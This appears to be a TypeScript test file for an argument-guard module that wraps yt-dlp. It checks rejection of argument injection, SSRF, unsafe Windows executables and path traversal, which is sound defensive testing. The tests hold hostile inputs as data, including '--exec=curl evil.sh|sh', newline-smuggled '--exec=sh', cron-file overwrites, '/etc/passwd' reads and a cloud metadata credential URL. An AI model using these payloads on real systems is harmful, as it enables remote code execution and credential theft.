/**
 * Attack-case tests for D-01 §8.4 / §8.5.
 *
 * Every defence layer gets at least one test that would FAIL if the layer were removed.
 * A layer with no such test is a comment, not a control.
 *
 * Run: node --test packages/pipeline/dist/subprocess/__tests__/argGuard.test.js
 */

import assert from 'node:assert/strict';
import { mkdtemp, mkdir, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, describe, it } from 'node:test';

import {
  MAX_URL_BYTES,
  assertWithinRoot,
  buildArgv,
  isPrivateOrReservedHost,
  isSafeExecutable,
  safePrompt,
  validateHttpUrl,
} from '../argGuard.js';

/** Assert rejection AND that it was rejected for the expected reason. */
function assertRejected(result: { ok: boolean }, expectedCode: string, label: string): void {
  assert.equal(result.ok, false, `${label}: expected rejection but it was ACCEPTED`);
  if (!result.ok) {
    assert.equal(
      (result as { code: string }).code,
      expectedCode,
      `${label}: rejected, but for the wrong reason`,
    );
  }
}

describe('L3 — argument injection (the attack shell:false does NOT stop)', () => {
  it('rejects the canonical yt-dlp arbitrary-execution payload', () => {
    // The headline case from D-01 §8.4: with shell:false this is not shell injection,
    // it is a perfectly ordinary argv element that yt-dlp parses as an OPTION.
    assertRejected(
      validateHttpUrl('--exec=curl evil.sh|sh'),
      'leading_dash',
      '--exec payload',
    );
  });

  it('rejects every option-shaped input', () => {
    for (const payload of [
      '-o/etc/cron.d/pwn',
      '--config-locations=/tmp/evil.conf',
      '--load-info-json=/tmp/x.json',
      '--batch-file=/etc/passwd',
      '-',
      '--',
      '--paths=/root',
    ]) {
      assertRejected(validateHttpUrl(payload), 'leading_dash', payload);
    }
  });

  it('rejects non-http schemes (file/ftp/data/javascript)', () => {
    assertRejected(validateHttpUrl('file:///etc/passwd'), 'bad_scheme', 'file:');
    assertRejected(validateHttpUrl('ftp://example.com/x.mp3'), 'bad_scheme', 'ftp:');
    assertRejected(validateHttpUrl('data:audio/wav;base64,AAAA'), 'bad_scheme', 'data:');
    assertRejected(validateHttpUrl('javascript:alert(1)'), 'bad_scheme', 'javascript:');
  });

  it('rejects embedded credentials', () => {
    assertRejected(
      validateHttpUrl('https://user:pass@example.com/a.mp3'),
      'embedded_credentials',
      'credentials',
    );
  });

  it('rejects control characters BEFORE parsing (URL() would launder them)', () => {
    // new URL() silently strips \n and \t. Checking after parsing would let a hostile
    // string through in a clean-looking form.
    assertRejected(
      validateHttpUrl('https://example.com/a.mp3\n--exec=sh'),
      'control_characters',
      'newline smuggling',
    );
    assertRejected(validateHttpUrl('https://example.com/\u0000'), 'control_characters', 'NUL');
    assertRejected(validateHttpUrl('https://exa\tmple.com/a'), 'control_characters', 'tab');
  });

  it('enforces the length cap in BYTES, not characters', () => {
    // 1000 four-byte emoji = 4000 bytes but only 1000 code units.
    const emojiUrl = `https://example.com/${'\u{1F600}'.repeat(1000)}`;
    assert.ok(emojiUrl.length < MAX_URL_BYTES, 'precondition: short in UTF-16 units');
    assertRejected(validateHttpUrl(emojiUrl), 'too_long', 'multibyte length bypass');
  });

  it('accepts a legitimate URL and returns the NORMALISED form', () => {
    const r = validateHttpUrl('https://Example.COM/path/a%20b.mp3?x=1');
    assert.equal(r.ok, true);
    if (r.ok) {
      // Validating one string and passing a different one is a classic bypass, so the
      // guard hands back exactly what it checked.
      assert.equal(r.value.href, 'https://example.com/path/a%20b.mp3?x=1');
      assert.equal(r.value.hostname, 'example.com');
    }
  });
});

describe('L3.3 — SSRF (our own daemon listens on 127.0.0.1)', () => {
  it('blocks loopback, private, link-local and metadata addresses', () => {
    for (const host of [
      '127.0.0.1', '127.1.2.3', '0.0.0.0', 'localhost',
      '10.0.0.1', '172.16.0.1', '172.31.255.254', '192.168.1.1',
      '169.254.169.254', // AWS/GCE metadata
      '100.64.0.1', // CGNAT
      '::1', 'fe80::1', 'fc00::1', 'fd12::34',
      '::ffff:127.0.0.1', // IPv4-mapped loopback
      'foo.local', 'db.internal',
    ]) {
      assert.equal(isPrivateOrReservedHost(host), true, `${host} should be blocked`);
    }
  });

  it('allows ordinary public addresses', () => {
    for (const host of ['example.com', '8.8.8.8', '1.1.1.1', '93.184.216.34', '2606:4700::1111']) {
      assert.equal(isPrivateOrReservedHost(host), false, `${host} should be allowed`);
    }
  });

  it('rejects a URL pointing at the metadata endpoint', () => {
    assertRejected(
      validateHttpUrl('http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
      'private_address',
      'cloud metadata SSRF',
    );
  });

  it('rejects a URL pointing at our own daemon port', () => {
    assertRejected(
      validateHttpUrl('http://127.0.0.1:7331/api/v1/settings'),
      'private_address',
      'confused-deputy against our own API',
    );
  });
});

describe('L6 — the argv invariant', () => {
  it('places user operands after "--" and never merges them into a flag', () => {
    const r = buildArgv({ flags: ['--ignore-config', '-o', '%(id)s.%(ext)s'], operands: ['https://example.com/a.mp3'] });
    assert.equal(r.ok, true);
    if (r.ok) {
      assert.deepEqual(r.value, [
        '--ignore-config', '-o', '%(id)s.%(ext)s',
        '--',
        'https://example.com/a.mp3',
      ]);
      // The operand is exactly one element — never concatenated into its neighbour.
      assert.equal(r.value.filter((a) => a.includes('example.com')).length, 1);
    }
  });

  it('still rejects a dash-leading operand even though "--" is present', () => {
    // Defence in depth: yt-dlp honours `--`, but we do not rely on every future tool
    // doing so.
    assertRejected(buildArgv({ flags: [], operands: ['--exec=sh'] }), 'leading_dash', 'dash after --');
  });

  it('rejects operands carrying control characters', () => {
    assertRejected(
      buildArgv({ flags: [], operands: ['https://x.com/a\nb'] }),
      'control_characters',
      'newline in operand',
    );
  });

  it('omits "--" when there are no operands', () => {
    const r = buildArgv({ flags: ['-version'], operands: [] });
    assert.equal(r.ok, true);
    if (r.ok) assert.deepEqual(r.value, ['-version']);
  });
});

describe('L4 — prompt truncation', () => {
  it('caps the prompt so it cannot blow past MAX_ARG_STRLEN', () => {
    const out = safePrompt('x'.repeat(100_000));
    assert.notEqual(out, null);
    assert.equal(out!.length, 1024);
  });

  it('strips control characters from the prompt', () => {
    assert.equal(safePrompt('hello\nworld'), 'hello world');
  });

  it('maps an empty prompt to null rather than an empty argv element', () => {
    assert.equal(safePrompt('   '), null);
    assert.equal(safePrompt(undefined), null);
  });
});

describe('L2 — executable allowlist (CVE-2024-27980)', () => {
  it('refuses .bat/.cmd on Windows, which Node can only run via cmd.exe', () => {
    for (const p of ['C:\\tools\\yt-dlp.bat', 'C:\\tools\\x.cmd', 'C:\\tools\\x.ps1']) {
      assertRejected(isSafeExecutable(p, 'win32'), 'unsafe_executable', p);
    }
  });

  it('allows .exe on Windows', () => {
    assert.equal(isSafeExecutable('C:\\tools\\yt-dlp.exe', 'win32').ok, true);
  });

  it('requires an absolute path so PATH is never searched', () => {
    assertRejected(isSafeExecutable('ffmpeg', 'linux'), 'path_escape', 'bare command name');
  });
});

describe('L7 (§8.5) — path traversal', () => {
  const dirs: string[] = [];
  after(() => {
    // Scratch dirs live under the OS temp dir; leaving them is harmless.
    dirs.length = 0;
  });

  it('blocks ../ escapes and allows legitimate children', async () => {
    const root = await mkdtemp(join(tmpdir(), 'openmemo-guard-'));
    dirs.push(root);
    await mkdir(join(root, 'media'), { recursive: true });
    await writeFile(join(root, 'media', 'ok.wav'), 'x');

    assertRejected(
      await assertWithinRoot(root, '../../../etc/passwd'),
      'path_escape',
      'dot-dot escape',
    );
    assertRejected(await assertWithinRoot(root, '/etc/passwd'), 'path_escape', 'absolute escape');

    const good = await assertWithinRoot(root, 'media/ok.wav');
    assert.equal(good.ok, true, 'legitimate child path should be accepted');
  });

  it('follows symlinks before deciding — a lexical check would be fooled', async () => {
    const root = await mkdtemp(join(tmpdir(), 'openmemo-guard-'));
    dirs.push(root);
    // "inside/escape" LOOKS contained, but resolves to /etc.
    await symlink('/etc', join(root, 'escape')).catch(() => undefined);

    const r = await assertWithinRoot(root, 'escape/passwd');
    // If this ever starts passing, someone replaced realpath with path.resolve.
    assertRejected(r, 'path_escape', 'symlink escape');
  });
});
